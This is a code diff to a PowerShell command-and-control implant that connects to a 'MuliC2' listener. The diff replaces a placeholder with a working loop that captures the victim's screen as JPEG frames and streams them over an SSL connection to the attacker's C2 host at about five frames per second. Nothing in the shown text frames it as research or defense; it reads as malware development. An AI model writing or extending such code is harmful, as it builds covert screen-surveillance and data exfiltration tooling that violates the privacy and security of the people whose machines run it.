@@ -249,7 +249,31 @@ try {
         }
     } -ArgumentList $global:sslStream
 
-    # ... (rest of screen capture loop) ...
+    # --- Screen Capture and Frame Sending Loop ---
+    try {
+        while ($global:isRunning) {
+            # Capture screen
+            $bmp = New-Object System.Drawing.Bitmap 200, 150
+            $graphics = [System.Drawing.Graphics]::FromImage($bmp)
+            $graphics.CopyFromScreen(0, 0, 0, 0, $bmp.Size)
+            $ms = New-Object System.IO.MemoryStream
+            $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+            $frameBytes = $ms.ToArray()
+            $ms.Dispose()
+            $graphics.Dispose()
+            $bmp.Dispose()
+
+            # Send frame with 4-byte little-endian length header
+            $lenBytes = [BitConverter]::GetBytes([int]$frameBytes.Length)
+            $global:sslStream.Write($lenBytes, 0, 4)
+            $global:sslStream.Write($frameBytes, 0, $frameBytes.Length)
+            $global:sslStream.Flush()
+
+            Start-Sleep -Milliseconds 200  # ~5 FPS
+        }
+    } catch {
+        Write-Host "[!] Exception in screen capture loop: $($_.Exception.Message)" -ForegroundColor Red
+    }
 } catch {
     Write-Host "[!] Connection error: $($_.Exception.Message)" -ForegroundColor Red
     Write-Host "[!] Make sure the MuliC2 listener is running on $C2Host`:$C2Port" -ForegroundColor Red
